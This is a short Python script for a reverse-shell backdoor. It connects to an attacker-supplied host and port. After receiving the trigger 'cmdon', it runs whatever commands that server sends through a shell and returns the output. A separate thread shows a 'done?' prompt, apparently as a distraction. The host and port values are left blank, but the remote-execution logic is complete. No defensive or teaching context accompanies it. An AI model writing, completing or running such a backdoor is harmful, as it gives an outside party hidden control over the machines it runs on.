import random
import socket
import threading
import os
import subprocess

def broke():
    HOST = ''#input host ip
    PORT = #input port ip

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))

    cmd_mode = False
    
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "cmdon":
            cmd_mode = True
            client.send("your in".encode('utf-8'))
        if cmd_mode:
            p=subprocess.Popen(server_command,shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE,)
            out, err = p.communicate()
            q = out.decode('utf-8')
            client.send(q.encode('utf-8'))
        else:
            if server_command == "check":
                print("connect")
            client.send(f"{server_command} was executed successfully".encode('utf-8'))
        
def run():
    done = False

    while not done:
        a = input("done?")
        if a == "done":
            done = True

    print("disconnected")

t1 = threading.Thread(target = run)
t2 = threading.Thread(target = broke)

t1.start()
t2.start()
